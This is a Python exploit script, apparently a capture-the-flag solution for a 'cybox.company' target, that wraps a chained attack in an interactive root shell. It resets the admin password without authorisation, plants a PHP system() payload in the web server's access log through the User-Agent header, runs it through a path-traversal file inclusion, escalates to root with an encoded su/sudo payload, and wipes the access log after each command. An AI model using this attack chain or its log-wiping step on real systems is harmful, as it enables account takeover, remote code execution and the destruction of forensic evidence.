from cmd import Cmd
import requests
import base64

url_reset_password = 'http://monitor.cybox.company/updatePasswordRequest.php'
admin_email = 'admin@cybox.company'
url_login = 'http://monitor.cybox.company/login.php'
url_ftp = 'http://ftp.cybox.company'
url_lfi = 'http://monitor.cybox.company/admin/styles.php?style='
access_log = '/opt/bitnami/apache2/logs/access_log'
lfi_access_log = f'../../../../../..{access_log}%00'
cookies = { 'PHPSESSID': 'gn3ehmq3ak1spci8g6dce7b2m5' }
new_user = 'sudo'
root_payload = "(sleep 1; echo {name}) | python -c \"import pty; " \
               "pty.spawn(['/bin/su','{name}','-c'," \
               "'echo {name} | sudo -S {cmd}']);\""
root_template_cmd = "echo {root_cmd_b64}| base64 -d | bash"

class Term(Cmd):
    prompt = "root$ "

    def __init__(self):
      super().__init__()
      print('[1] Reset admin account monitor vhost ...')
      self.reset_admin_passwd()
      print(f'[2]  Create "{new_user}" user in server ...')
      self.create_user_server()

    def reset_admin_passwd(self):
      new_passwd = '123456'
      data = {
          'email': admin_email,
          'new_password': new_passwd,
          'confirm_password': new_passwd,
      }
      requests.post(url_reset_password, cookies= cookies, data= data)
      data = {
          'email': admin_email,
          'password': new_passwd,
      }
      requests.post(url_login, cookies= cookies, data= data)

    def create_user_server(self):
      cmd = f'/opt/registerlauncher {new_user}'
      self.send_cmd(cmd, show_output= True)


    def parse_root_cmd(self, cmd):
      root_cmd_payload = root_payload.format(name= new_user, cmd= cmd)
      root_cmd_b64 = base64.b64encode(root_cmd_payload.encode())
      root_cmd = root_template_cmd.format(root_cmd_b64= root_cmd_b64.decode())
      return root_cmd

    def default(self, args):
      cmd = args
      root_cmd = self.parse_root_cmd(cmd)
      self.send_cmd(root_cmd, show_output= True)
      self.clean_session()

    def clean_session(self):
      cmd = f"su - -c \\'> {access_log}\\'"
      root_cmd = self.parse_root_cmd(cmd)
      self.send_cmd(root_cmd, True)

    def send_cmd(self, cmd, show_output= False):
      headers = {
          'User-Agent': f"<?php system('{cmd}'); ?>"
      }
      _ = requests.get(url_ftp, headers= headers)
      response = requests.get(f"{url_lfi}{lfi_access_log}", cookies= cookies)
      if show_output and response.status_code == 200:
        output = response.text.split('"GET / HTTP/1.1" 200 5295 "-" "')[-1]
        print(output)
      elif show_output:
        print(response.content)

if __name__ == "__main__":
    term = Term()
    term.cmdloop()
